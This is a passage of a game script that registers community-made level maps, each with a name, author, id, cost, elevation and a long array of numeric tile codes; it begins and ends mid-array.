0,0,40,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,20,20,0,40,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,95,40,0,40,0,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,95,95,0,20,90,20,40,40,40,54,54,40,40,40,40,40,40,40,40,40,40,40,0,91,91,20,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,100,91,20,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,14,97,14,14,0,0,0,0,0,0,0,0,10,10]});
maps.push({name="Jump fast fix",author="HaRyDe",id="#1661600863",direction="forward",cost=246,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,124,124,130,122,121,0,0,0,0,5,5,0,0,0,0,102,44,44,0,0,127,124,130,122,121,39,37,15,0,5,5,0,0,1,1,1,1,44,1,0,0,0,0,0,1,1,1,13,0,5,5,0,0,1,131,101,44,44,1,0,0,0,0,0,1,97,1,11,0,91,91,0,0,1,44,101,44,44,1,1,22,22,0,0,1,124,1,9,0,91,91,0,0,1,44,101,124,124,98,0,22,22,0,124,124,124,1,7,5,5,5,0,0,1,44,101,124,124,98,0,22,22,0,124,124,124,1,7,5,5,5,0,0,1,44,101,44,44,1,1,22,22,0,0,1,96,1,9,0,5,5,0,0,1,131,101,44,44,1,0,0,0,0,0,1,99,1,11,0,5,5,0,0,1,1,1,1,1,1,0,0,0,0,0,1,1,1,13,0,5,5,0,0,1,1,1,1,1,0,0,126,124,130,122,121,39,37,15,0,5,5,0,0,0,5,5,5,1,0,0,124,124,130,122,121,0,0,0,0,5,5,0,0,0,5,132,5,1,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,86,86,86,1,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,5,5,5,5,1,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,2,2,5,1,0,0,0,0,0,0,0,0,5,93,5,93,5,93,5]});
maps.push({name="Climbable",author="Niikos",id="#1661614231",direction="forward",cost=400,elevation=15,map=[9,2,2,9,9,31,31,33,33,33,115,115,117,117,117,19,19,21,93,93,9,9,9,9,9,31,31,31,33,33,115,115,115,117,117,19,19,19,21,93,9,9,9,9,9,31,31,31,31,33,115,115,115,115,117,19,19,19,19,21,9,9,9,9,9,31,31,31,33,33,115,115,115,117,117,19,19,19,21,21,9,9,9,9,9,31,31,33,33,33,115,115,117,117,117,19,19,21,21,21,31,31,31,31,31,111,111,111,113,113,15,15,17,17,19,39,39,39,41,41,31,31,31,31,31,111,111,113,113,113,15,17,17,19,19,39,39,41,41,43,33,31,31,31,33,111,113,113,113,113,17,17,17,19,19,39,41,41,43,43,33,33,31,33,33,113,113,113,113,113,17,19,19,19,19,41,41,43,43,43,33,33,33,33,33,113,113,113,113,113,19,19,19,19,19,41,43,43,43,43,115,115,115,115,115,15,15,17,17,19,39,39,39,41,41,123,123,123,123,124,115,115,115,115,115,15,17,17,19,19,39,39,41,41,43,123,123,123,124,124,117,115,115,115,117,17,17,17,19,19,39,41,41,43,43,123,123,124,124,124,117,117,115,117,117,17,19,19,19,19,41,41,43,43,43,123,124,124,124,124,117,117,117,117,117,19,19,19,19,19,41,43,43,43,43,124,124,124,124,124,19,19,19,19,19,39,39,39,41,41,123,123,123,123,124,24,24,24,24,24,19,19,19,19,19,39,39,41,41,43,123,123,123,124,124,24,24,24,24,24,21,19,19,19,21,39,41,41,43,43,123,123,124,124,124,24,24,24,24,24,94,21,19,21,21,41,41,43,43,43,123,124,124,124,124,24,24,24,24,24,94,94,21,21,21,41,43,43,43,43,124,124,124,124,124,24,24,2,2,24]});
maps.push({name="TeleWorlds",author="Niikos",id="#1661617026",direction="left",cost=338,elevation=17,map=[5,2,2,5,0,110,134,134,110,1,1,24,137,137,24,1,1,0,0,0,5,5,5,5,0,110,110,110,110,1,1,24,24,24,24,1,1,34,34,34,5,5,5,5,0,110,110,110,110,1,1,24,24,24,24,1,1,132,132,34,94,5,5,94,0,110,110,110,110,1,1,24,24,24,24,1,1,34,34,34,94,5,5,94,0,110,110,110,110,1,1,24,24,24,24,1,1,34,34,34,0,5,5,0,0,110,110,110,110,1,1,0,0,0,0,1,1,34,34,34,0,5,5,0,0,92,92,92,92,1,1,0,0,0,0,1,1,34,34,0,0,5,5,0,0,120,120,120,120,1,1,65,65,65,65,1,1,34,34,0,0,5,5,0,0,120,120,120,120,1,1,65,65,65,65,1,1,127,127,0,0,131,131,0,0,120,120,120,120,1,1,5,5,5,5,1,1,0,0,0,1,1,1,0,0,120,120,120,120,1,1,5,5,5,5,1,1,0,0,0,0,0,0,0,0,120,120,120,120,1,1,5,5,5,5,1,1,0,0,0,0,0,0,0,0,120,136,136,120,1,1,5,5,5,5,1,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,5,138,138,5,1,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,65,65,0,0,0,0,0,0,0,62,139,139,62,0,0,0,0,0,0,0,65,65,0,62,62,62,62,0,0,62,62,62,62,0,0,0,0,0,0,0,14,14,0,2,62,62,62,62,62,62,62,62,62,0,0,0,0,93,14,14,14,14,14,2,62,62,62,62,62,62,62,62,62,0,0,0,0,93,14,14,14,14,14,62,62,62,62,0,0,0,0,0,0,0,0,0,0,93,14,14,133,133,14]});
maps.push({name="Abyss",author="ZpLit",id="#1661627682",direction="left",cost=238,elevation=0,map=[0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,87,33,32,32,32,32,32,32,32,32,32,32,32,32,32,32,33,33,1,1,33,33,32,32,32,32,32,32,32,32,32,32,32,32,32,32,33,33,1,1,32,32,0,0,0,0,127,0,0,0,0,127,0,0,0,0,32,32,1,1,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,1,1,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,1,1,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,1,1,32,32,129,0,0,0,0,0,0,0,0,0,0,0,0,128,32,32,1,1,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,1,1,32,32,0,0,0,0,0,0,94,94,0,0,0,0,0,0,32,32,1,1,32,32,0,0,0,0,0,0,94,94,0,0,0,0,0,0,32,32,1,1,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,1,1,32,32,129,0,0,0,0,0,0,0,0,0,0,0,0,128,32,32,1,1,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,1,1,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,1,1,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,1,1,32,32,0,0,0,0,126,0,0,0,0,126,0,0,0,0,32,32,1,2,33,33,32,95,32,32,32,32,32,32,32,32,32,32,32,32,33,33,1,2,88,33,32,95,32,32,32,32,32,32,32,32,32,32,32,32,33,87,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0]});
maps.push({name="Call of the Void",author="ZpLit",id="#1661644563",direction="forward",cost=200,elevation=0,map=[0,0,0,0,0,0,0,0,22,2,2,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,87,22,22,22,22,22,22,22,22,22,22,22,22,87,0,0,0,0,0,0,22,23,23,23,23,23,23,23,23,23,23,23,23,22,0,0,0,0,0,0,22,23,24,24,24,24,24,24,24,24,24,24,23,22,0,0,0,0,0,0,22,23,24,0,0,0,130,130,0,0,0,24,23,22,0,0,0,0,0,0,22,23,24,0,0,0,130,130,0,0,0,24,23,22,0,0,0,0,0,0,22,23,24,0,0,0,12,12,0,0,0,24,23,22,0,0,0,0,0,0,22,23,24,130,130,12,94,94,12,130,130,24,23,22,0,0,0,0,0,0,22,23,24,130,130,12,94,94,12,130,130,24,23,22,0,0,0,0,0,0,22,23,24,0,0,0,12,12,0,0,0,24,23,22,0,0,0,0,0,0,22,23,24,0,0,0,130,130,0,0,0,24,23,22,0,0,0,0,0,0,22,23,24,0,0,0,130,130,0,0,0,24,23,22,0,0,0,0,0,0,22,23,24,24,24,24,24,24,24,24,24,24,23,22,0,0,0,0,0,0,22,23,23,23,23,23,23,23,23,23,23,23,23,22,0,0,0,0,0,0,87,22,22,22,22,22,22,22,22,22,22,22,22,87,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,86,2,2,86,0,0,0,0,0,0,0,0]});
maps.push({name="Serene Grace",author="ZpLit",id="#1661653850",direction="left",cost=232,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,105,105,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,106,106,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,107,107,13,13,13,0,0,0,0,0,0,0,0,0,0,0,13,108,108,108,108,108,108,108,108,13,0,0,0,0,0,0,0,0,0,0,13,108,90,108,108,108,108,90,108,13,0,0,0,0,0,0,0,0,0,13,108,108,108,65,65,65,65,108,108,108,13,0,0,0,0,0,0,0,0,13,93,108,108,65,65,65,65,108,108,93,13,0,0,0,0,0,0,0,0,13,93,108,108,65,65,65,65,108,108,93,13,0,0,0,0,0,0,0,0,13,108,90,108,65,65,65,65,108,90,108,13,0,0,0,0,0,0,0,0,0,13,108,108,90,108,108,90,108,108,13,0,0,0,0,0,0,0,0,0,0,13,108,108,108,108,108,108,108,108,13,0,0,0,0,0,0,0,0,0,0,0,13,13,18,47,47,18,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,46,46,17,0,0,0,0,0,0,0,0,24,22,16,16,16,16,16,16,16,45,45,16,16,16,16,16,0,0,0,0,2,5,88,45,45,45,45,90,45,45,45,45,45,45,45,45,5,5,92,9,2,5,45,45,90,45,45,45,45,45,45,45,45,45,45,45,5,5,92,9,24,22,16,16,16,16,16,16,16,16,16,16,16,16,16,16,100,0,0,0]});
maps.push({name="Go Around",author="ZpLit",id="#1661698326",direction="left",cost=126,elevation=-6,map=[0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,45,105,5,6,7,7,0,0,0,0,0,0,0,0,0,0,0,0,1,45,45,105,5,6,7,7,7,0,0,0,0,0,0,0,0,100,96,5,105,45,90,105,5,6,7,7,7,7,0,0,0,0,0,0,0,96,97,5,105,45,45,1,0,0,7,7,7,7,0,0,0,0,0,0,0,5,5,5,105,45,11,1,0,0,0,8,8,8,0,0,0,0,0,0,0,88,5,5,1,11,11,1,0,0,0,9,9,9,0,0,0,0,0,0,0,2,5,11,96,11,90,11,0,0,9,90,9,9,0,0,0,0,0,0,0,2,5,11,96,11,11,11,10,9,9,9,9,9,0,0,0,0,0,0,0,0,0,94,94,96,11,11,10,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,96,11,10,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Knockoff v2",author="MoistNoodlez",id="#1661698700",direction="forward",cost=448,elevation=0,map=[0,0,0,0,0,0,112,0,0,0,0,0,0,0,0,92,112,2,2,0,0,0,0,0,0,0,112,0,0,0,0,0,0,0,0,0,0,112,112,0,0,0,77,44,77,0,112,0,77,44,77,0,0,0,0,0,0,112,112,0,0,0,77,44,77,0,112,0,77,44,77,0,0,0,0,0,0,112,112,0,0,0,77,44,77,0,112,0,77,44,77,0,0,0,0,0,0,112,112,0,114,92,77,44,77,0,112,0,77,44,77,92,114,0,0,0,0,112,112,0,114,92,77,44,77,0,112,0,77,44,77,92,114,0,0,0,0,112,112,0,114,92,77,44,77,0,112,0,77,44,77,92,114,0,0,0,0,112,112,0,113,92,77,44,77,0,112,0,77,44,77,92,113,0,0,0,0,112,112,0,114,92,77,44,77,0,112,0,77,44,77,92,114,0,0,0,0,112,112,0,114,92,77,44,77,0,112,0,77,44,77,92,114,0,0,0,0,112,112,0,113,92,77,44,77,0,112,0,77,44,77,92,113,0,0,0,0,112,112,0,114,92,77,44,77,0,112,0,77,44,77,92,114,0,0,0,0,112,112,0,113,92,77,44,77,0,112,0,77,44,77,92,113,0,0,0,0,112,112,0,114,92,77,44,77,0,112,0,77,44,77,92,114,0,0,0,0,112,112,0,113,92,77,44,77,0,112,0,77,44,77,92,113,0,0,0,0,112,112,0,114,92,77,44,77,0,112,0,77,44,77,92,114,0,0,0,132,112,112,132,113,92,77,44,77,0,112,0,77,44,77,92,113,0,0,0,0,112,112,0,0,0,77,44,77,0,112,0,1,1,1,1,1,1,1,0,0,112,112,0,0,0,0,0,0,0,88,112,112,93,112,100,112,131,1,0,0,2,2,0]});
maps.push({name="Eruption",author="ZpLit",id="#1661729189",direction="left",cost=468,elevation=0,map=[0,0,0,0,0,0,0,0,0,77,77,0,0,0,0,2,2,0,0,0,0,0,0,8,8,8,8,8,7,81,81,7,8,8,8,8,8,0,0,0,0,0,8,8,8,8,8,8,7,81,81,7,8,8,8,8,8,8,0,0,0,8,8,8,8,8,11,11,11,77,77,11,11,11,8,8,8,8,8,0,0,8,8,8,8,11,11,13,11,81,81,11,13,11,11,8,8,8,8,0,0,8,8,8,11,9,11,11,16,77,77,16,11,9,11,11,8,8,8,0,0,8,8,11,13,11,13,16,16,81,81,16,16,11,13,11,11,8,8,0,0,8,8,11,9,11,16,18,22,77,77,21,16,16,11,9,11,8,8,0,0,7,7,11,11,16,16,21,24,76,76,24,20,16,16,13,11,7,7,0,77,83,83,77,83,77,83,77,76,24,24,76,77,84,77,84,77,84,84,77,77,83,83,77,83,77,83,77,76,24,24,76,77,84,77,84,77,84,84,77,0,7,7,11,11,16,18,21,24,76,76,24,23,18,16,11,11,7,7,0,0,8,8,11,13,11,16,16,22,77,77,21,16,16,11,13,11,8,8,0,0,8,8,11,11,9,11,16,16,82,82,16,16,11,9,11,11,8,8,0,0,88,8,8,11,13,11,9,16,77,77,16,11,11,13,11,8,8,8,0,2,8,8,8,8,11,11,13,11,82,82,13,9,11,11,8,8,8,8,0,2,8,8,8,8,8,11,11,11,77,77,11,11,11,8,8,8,8,8,0,0,0,88,8,8,8,8,8,7,82,82,7,8,8,8,8,8,8,0,0,0,0,0,8,8,8,8,8,7,82,82,7,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,77,77,0,0,0,0,0,0,0,0,0]});
maps.push({name="LITERALLY SOMETHING",author="IProbie",id="#1661753196",direction="forward",cost=369,elevation=0,map});
maps.push({name="notitle1",author="KizanFlandre",id="#1661769470",direction="left",cost=268,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,1,5,5,0,0,1,5,5,5,5,5,5,5,5,1,0,0,0,0,0,1,5,5,0,0,1,5,5,5,5,5,5,5,5,1,0,0,0,0,0,1,5,5,0,0,1,5,5,1,1,1,1,5,5,1,0,0,0,0,0,1,5,5,0,0,1,5,5,1,0,0,1,5,5,1,0,0,0,0,0,1,5,5,0,0,1,5,5,1,0,0,1,98,98,1,1,1,1,1,1,1,5,5,0,2,101,5,5,1,0,0,1,5,5,5,5,5,5,5,5,96,5,5,0,2,101,5,5,1,0,0,1,5,5,5,5,5,5,5,5,96,5,5,0,0,1,130,130,1,0,0,1,130,130,1,1,1,1,1,1,1,130,130,0,0,1,130,130,1,0,0,1,130,130,1,0,0,0,0,0,1,130,130,0,0,1,130,130,1,0,0,1,130,130,1,0,0,0,0,0,1,130,130,0,0,1,130,130,1,0,0,1,130,130,1,0,0,0,0,0,1,130,130,0,0,1,130,130,1,0,0,1,130,130,1,0,0,0,0,0,1,5,5,0,0,1,130,130,1,0,0,1,130,130,1,0,0,0,0,0,1,97,5,0,0,1,130,130,1,0,0,1,5,5,1,0,0,0,0,0,1,1,1,0,0,1,130,130,1,0,0,1,5,99,1,0,0,0,0,0,0,0,0,0,0,1,102,5,1,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="In the clouds",author="Applily",id="#1661798990",direction="forward",cost=280,elevation=17,map=[0,0,0,135,5,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),2,2,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),5,135,0,0,0,0,0,0,0,0,135,6,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),6,Vector(255,252,252),Vector(255,252,252),93,Vector(255,252,252),6,135,0,0,0,0,0,0,0,0,135,7,Vector(255,252,252),93,Vector(255,252,252),Vector(255,252,252),7,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),7,135,0,0,0,0,0,0,0,0,135,8,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),8,Vector(255,252,252),Vector(255,252,252),94,Vector(255,252,252),8,135,0,0,0,0,0,0,0,0,135,9,Vector(255,252,252),94,Vector(255,252,252),Vector(255,252,252),9,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),9,135,0,0,0,0,0,0,0,0,135,10,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),10,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),10,135,0,0,0,0,0,0,0,0,135,11,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),11,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),11,135,0,0,0,0,0,0,0,0,135,12,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),12,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),12,135,0,0,0,0,0,0,0,0,135,13,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),13,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),13,135,0,0,0,0,0,0,0,0,135,14,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),14,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),14,135,0,0,0,0,0,0,0,0,135,15,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),15,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),15,135,0,0,0,0,0,0,0,0,135,16,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),16,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),16,135,0,0,0,0,0,0,0,0,135,17,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),17,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),17,135,0,0,0,0,0,0,0,0,135,18,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),18,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),18,135,0,0,0,0,0,0,0,0,135,19,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),19,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),19,135,0,0,0,0,0,0,0,0,135,20,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),20,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),20,135,0,0,0,0,0,0,0,0,135,21,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),21,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),21,135,0,0,0,0,0,0,0,0,135,22,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),22,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),22,135,0,0,0,0,0,0,0,0,135,23,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),23,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),23,135,0,0,0,0,0,0,0,0,135,24,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),2,2,Vector(255,252,252),Vector(255,252,252),Vector(255,252,252),24,135,0,0,0,0,0]});
maps.push({name="Overhead v2",author="MoistNoodlez",id="#1661811949",direction="forward",cost=231,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,131,5,0,7,125,125,7,7,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,5,0,0,0,12,14,19,19,0,134,89,129,24,130,130,130,130,0,0,0,5,0,0,0,66,66,66,19,0,24,24,24,24,0,0,0,0,0,0,0,5,0,0,0,0,0,0,92,0,1,1,1,1,1,1,1,0,0,0,0,5,0,0,0,0,0,0,0,0,22,22,21,21,20,20,20,0,0,0,0,5,0,0,10,10,10,8,8,8,135,135,135,135,135,135,135,135,130,0,0,5,0,0,74,74,67,66,133,133,135,135,135,135,135,135,135,135,130,0,0,5,0,0,74,74,67,66,133,133,22,22,21,21,20,20,20,0,0,0,0,5,0,0,10,10,10,8,8,8,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,0,0,21,92,0,0,0,21,0,0,0,0,0,0,0,0,0,0,0,96,0,0,0,0,20,92,0,20,0,0,0,0,0,0,0,0,0,0,0,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,126,0,0,1,0,0,0,0,0,0,0,65,65,0,0,0,0,0,0,0,24,65,132,1,0,19,92,0,0,0,0,5,5,0,0,0,0,19,19,19,24,3,18,1,0,0,0,0,0,0,0,2,2,0,0,0,0,100,93,97]});
maps.push({name="Tic Tac Toe",author="TF2 Pencil",id="#1661835870",direction="forward",cost=310,elevation=-4,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,18,0,0,0,0,0,18,0,0,0,0,0,0,0,0,0,13,13,13,130,18,130,13,0,13,130,18,130,13,13,13,0,0,0,0,0,13,0,13,130,18,130,0,13,0,130,18,130,13,0,13,0,0,0,0,0,13,13,13,130,18,130,13,0,13,130,18,130,13,13,13,0,0,0,0,0,130,130,130,130,18,130,130,130,130,130,18,130,130,130,130,0,0,0,0,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,0,0,0,0,130,130,130,130,18,130,130,130,130,130,18,130,130,130,130,0,0,0,0,0,13,0,13,130,18,130,13,13,13,130,18,130,13,0,13,0,0,0,0,0,0,13,0,130,18,130,13,0,13,130,18,130,0,13,0,0,0,0,0,0,13,0,13,130,18,130,13,13,13,130,18,130,13,0,13,0,0,0,0,0,130,130,130,130,18,130,130,130,130,130,18,130,130,130,130,0,0,0,0,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,0,0,0,0,130,130,130,130,18,130,130,130,130,130,18,130,130,130,130,0,0,0,0,0,13,13,13,130,18,130,13,0,13,130,18,130,13,13,13,0,0,0,0,0,13,0,13,130,18,130,0,13,0,130,18,130,13,0,13,0,0,0,0,0,13,13,13,130,18,130,13,0,13,130,18,130,13,13,13,0,0,0,0,0,0,0,0,0,18,0,0,0,0,0,18,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0]});
maps.push({name="Big Hill",author="TF2 Pencil",id="#1661838602",direction="forward",cost=220,elevation=17,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,22,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,22,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,22,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,22,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,22,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,22,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,22,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,22,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,22,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,22,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Do Not Go Right",author="TF2 Pencil",id="#1661838646",direction="forward",cost=167,elevation=-13,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,19,19,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,127,127,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,6,6,6,6,6,6,6,6,6,6,6,6,6,6,0,0,0,0,0,0,6,6,6,6,6,6,6,6,6,6,6,6,6,100,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Fox McCloud Shine",author="TF2 Pencil",id="#1661838915",direction="forward",cost=290,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,11,11,66,66,66,66,66,66,11,11,0,0,0,0,0,0,0,0,0,11,11,66,66,66,66,66,66,66,66,11,11,0,0,0,0,0,0,0,11,11,66,66,66,65,65,65,65,66,66,66,11,11,0,0,0,0,0,11,11,66,66,66,65,11,11,11,11,65,66,66,66,11,11,0,0,0,0,11,66,66,66,65,11,11,0,0,11,11,65,66,66,66,11,0,0,0,0,11,66,66,65,11,11,0,0,0,0,11,11,65,66,66,11,0,0,0,0,11,66,66,65,11,0,0,0,0,0,0,11,65,66,66,11,0,0,0,0,11,66,66,65,11,11,0,0,0,0,11,11,65,66,66,11,0,0,0,0,11,66,66,66,65,11,11,0,0,11,11,65,66,66,66,11,0,0,0,0,11,11,66,66,66,65,11,11,11,11,65,66,66,66,11,11,0,0,0,0,0,11,11,66,66,66,65,65,65,65,66,66,66,11,11,0,0,0,0,0,0,0,11,11,66,66,66,66,66,66,66,66,11,11,0,0,0,0,0,0,0,0,0,11,11,66,66,66,66,66,66,11,11,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11